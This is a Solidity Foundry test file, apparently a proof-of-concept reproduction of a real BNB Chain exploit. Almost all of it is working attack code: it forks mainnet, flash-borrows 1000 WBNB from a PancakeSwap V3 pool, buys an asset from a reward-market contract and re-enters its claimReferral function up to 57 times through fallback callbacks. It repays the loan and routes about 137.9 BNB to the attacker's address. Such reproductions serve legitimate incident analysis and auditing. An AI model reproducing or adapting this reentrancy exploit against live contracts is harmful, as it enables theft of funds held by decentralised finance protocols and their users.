
pragma solidity ^0.8.20;

import {IERC20Like, Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.ATTACKER_EOA;
    address constant ATTACK_CONTRACT = Addresses.ATTACK_CONTRACT;
    uint256 constant TX_TIMESTAMP = 1740111790;
    uint256 constant TX_BLOCK_NUMBER = 46843424;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        vm.warp(TX_TIMESTAMP);
        vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack = _deployAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (OurAttack attack) {
        _etchAttack();
        _etchChildren();
        attack = OurAttack(payable(ATTACK_CONTRACT));
        attack.bindAttackChildren();
    }

    function _etchAttack() internal {
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
        vm.setNonce(ATTACK_CONTRACT, 1);
    }

    function _etchChildren() internal {
        vm.etch(Addresses.ASSET_PURCHASE_CHILD, type(AttackChild).runtimeCode);
        vm.etch(Addresses.FLASH_CALLBACK_CHILD, type(AttackChild).runtimeCode);
    }

    function _prepareProfit(OurAttack attack) internal {
        _prepareProfit(address(attack), Addresses.FLASH_CALLBACK_CHILD);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.PROFIT_SINK, address(0), Addresses.ZERO, "BNB", 1);
        _expectProfit(Addresses.ATTACKER_EOA, address(0), Addresses.ZERO, "BNB", 137876033699999999999);
    }
}

contract OurAttack {
    AttackChild public assetPurchaseChild;
    AttackChild public flashCallbackChild;

    constructor() payable {
        bindAttackChildren();
    }

    function attack() external payable {
        _executeSetup();
    }

    function executeSetup() external payable {
        _executeSetup();
    }

    function bindAttackChildren() public {
        assetPurchaseChild = AttackChild(payable(Addresses.ASSET_PURCHASE_CHILD));
        flashCallbackChild = AttackChild(payable(Addresses.FLASH_CALLBACK_CHILD));
    }

    function bindAttackChild(address child) external {
        assetPurchaseChild = AttackChild(payable(child));
    }

    function deployAttackChildContracts() external returns (address) {
        bindAttackChildren();
        return address(assetPurchaseChild);
    }

    function _executeSetup() internal {
        if (address(assetPurchaseChild) == address(0)) bindAttackChildren();


        require(address(flashCallbackChild).code.length != 0, "flash callback child missing");
        flashCallbackChild.prepareFlashChild();
        flashCallbackChild.startFlashLoan();
    }

    receive() external payable {}

    fallback() external payable {}
}

contract AttackChild {
    bool private flashDone;
    bool private marketNftCbDone;
    bool private childNftCbDone;
    uint256 private referralCursor;

    receive() external payable {
        if (
            address(this) == Addresses.FLASH_CALLBACK_CHILD
                && (msg.sender == Addresses.REWARD_MARKET || msg.sender == Addresses.FLASH_CALLBACK_CHILD)
        ) {
            _claimReferralChain();
        }
    }

    function testAttack() external payable {
        startFlashLoan();
    }

    function startFlashLoan() public payable {
        IPancakeV3Pool(Addresses.PANCAKE_POOL).flash(address(this), 0, 1000000000000000000000, hex"");
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata callbackPayload) external payable {
        fee0;
        fee1;
        callbackPayload;
        if (!flashDone) _flashCallback();
    }

    function safeTransferFrom(address from, address to, uint256 tokenId, uint256 amount, bytes calldata callbackPayload)
        external
        payable
    {
        to;
        tokenId;
        amount;
        callbackPayload;
        if (from == Addresses.REWARD_MARKET) {
            if (!marketNftCbDone) _acceptMarketNft();
            return;
        }
        if (from == Addresses.FLASH_CALLBACK_CHILD) {
            if (!childNftCbDone) _acceptChildNft();
            return;
        }
        if (!childNftCbDone) _acceptChildNft();
    }

    fallback() external payable {
        if (msg.sig == bytes4(0x50eb1dfe)) {
            (address market, uint256 assetId) = abi.decode(msg.data[4:], (address, uint256));
            _purchaseWithBnb(market, assetId);
            return;
        }
        _claimReferralChain();
    }

    function prepareFlashChild() external payable {}

    function prepareAssetChild() external payable {}

    function buyAssetWithBnb() external payable {
        _purchaseWithBnb(Addresses.REWARD_MARKET, 81122);
    }

    function _flashCallback() internal {
        flashDone = true;
        _unwrapFlashLoan();
        uint256 assetId = _quoteAsset();
        _callAssetChild(assetId);
        _claimReferral();
        _settleLoanProfit();
    }

    function _unwrapFlashLoan() internal {
        IERC20Like(Addresses.WBNB).balanceOf(address(this));
        IWBNB(Addresses.WBNB).withdraw(1000000000000000000000);
    }

    function _quoteAsset() internal returns (uint256 assetId) {
        (bool ok, bytes memory result) = Addresses.REWARD_MARKET
            .call(
                abi.encodeWithSelector(
                    bytes4(0xded4de3a),
                    address(this),
                    uint256(2008),
                    uint256(6),
                    uint256(6),
                    uint256(1000000000000000000000),
                    uint256(0),
                    uint256(1677960000),
                    uint256(18766392275824)
                )
            );
        require(ok, "asset quote failed");
        assetId = abi.decode(result, (uint256));
    }

    function _callAssetChild(uint256 assetId) internal {
        require(Addresses.ASSET_PURCHASE_CHILD.code.length != 0, "asset child missing");
        AttackChild(payable(Addresses.ASSET_PURCHASE_CHILD)).prepareAssetChild();
        (bool ok,) = Addresses.ASSET_PURCHASE_CHILD.call{value: 1000000000000000000000}(
            abi.encodeWithSelector(bytes4(0x50eb1dfe), Addresses.REWARD_MARKET, assetId)
        );
        require(ok, "asset child purchase failed");
    }

    function _purchaseWithBnb(address market, uint256 assetId) internal {
        IRewardMarket(market).buyAsset{value: 1000000000000000000000}(assetId, 1, Addresses.FLASH_CALLBACK_CHILD);
    }

    function _claimReferral() internal {
        (bool ok,) =
            Addresses.REWARD_MARKET.call(abi.encodeWithSignature("claimReferral(address)", Addresses.ZERO));
        ok;
    }

    function _claimReferralChain() internal {
        uint256 claimIndex = referralCursor++;
        if (claimIndex == 0) return;
        if (claimIndex <= 57) _claimReferral();
    }

    function _settleLoanProfit() internal {
        uint256 depositAmount = address(this).balance;
        if (depositAmount > 1000100000000000000000) depositAmount = 1000100000000000000000;
        if (depositAmount != 0) IWBNB(Addresses.WBNB).deposit{value: depositAmount}();

        IERC20Like(Addresses.WBNB).transfer(Addresses.PANCAKE_POOL, 1000100000000000000000);
        _sendProfit(Addresses.PROFIT_SINK, 1);
        _sendProfit(Addresses.ATTACKER_EOA, 137899999999999999999);
    }

    function _sendProfit(address recipient, uint256 cap) internal {
        uint256 amount = address(this).balance;
        if (amount > cap) amount = cap;
        (bool ok,) = payable(recipient).call{value: amount}("");
        ok;
    }

    function _acceptMarketNft() internal {
        marketNftCbDone = true;
    }

    function _acceptChildNft() internal {
        childNftCbDone = true;
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant PANCAKE_POOL = 0x172fcD41E0913e95784454622d1c3724f546f849;
    address internal constant ASSET_PURCHASE_CHILD = 0x8F327e60Fb2a7928c879C135453Bd2b4eD6B0fE9;
    address internal constant REWARD_MARKET = 0x9823E10A0bF6F64F59964bE1A7f83090bf5728aB;
    address internal constant FLASH_CALLBACK_CHILD = 0xB4C32404de3367Ca94385ac5b952a7a84B5BdF76;
    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address internal constant PROFIT_SINK = 0xCcB42A9b8d6C46468900527Bc741938E78AB4577;
    address internal constant ATTACK_CONTRACT = 0xD4c80700Ca911D5d3026a595E12Aa4174F4cACb3;
    address internal constant ATTACKER_EOA = 0xFb1cc1548D039f14b02cfF9aE86757Edd2CDB8A5;
}

interface IRewardMarket {
    function buyAsset(uint256 assetId, uint256 quantity, address recipient) external payable;
}

interface IPancakeV3Pool {
    function flash(address recipient, uint256 borrowToken0, uint256 borrowToken1, bytes calldata callbackPayload)
        external;
}

interface IWBNB {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}
